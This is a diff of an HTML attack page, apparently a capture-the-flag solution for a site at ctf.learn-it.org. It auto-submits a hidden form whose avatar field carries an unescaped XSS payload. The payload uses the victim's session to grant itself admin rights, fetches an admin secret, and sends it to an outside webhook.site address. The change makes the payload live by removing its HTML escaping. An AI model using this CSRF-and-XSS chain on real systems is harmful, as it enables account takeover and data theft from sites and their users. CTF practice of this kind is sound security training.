@@ -6,12 +6,12 @@
 <input name="avatar[hair]" value="x" />
 <input name="avatar[eyes]" value="x" />
 <input name="avatar[shirt]" value="x" />
-<input name="avatar[background]" value="&quot;&gt;&lt;/svg&gt;&lt;img src=x onerror=fetch('/api/update-profile',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({isAdmin:true})}).then(()=&gt;fetch('/api/admin/secret',{credentials:'include'})).then(r=&gt;r.json()).then(d=&gt;location='https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag='+d.flag)&gt;" />
+<input name="avatar[background]" value="&quot;></svg><img src=x onerror=fetch('/api/update-profile',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({isAdmin:true})}).then(()=>fetch('/api/admin/secret',{credentials:'include'})).then(r=>r.json()).then(d=>location='https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag='+d.flag)>" />
 </form>
 <iframe name="x" style="display:none"></iframe>
 <script>
 document.getElementById('f').submit();
-setTimeout(function(){ location='http://ctf.learn-it.org:39951/dashboard'; }, 1000);
+setTimeout(function(){ location='http://ctf.learn-it.org:39951/dashboard'; }, 5000);
 </script>
 </body>
 </html>
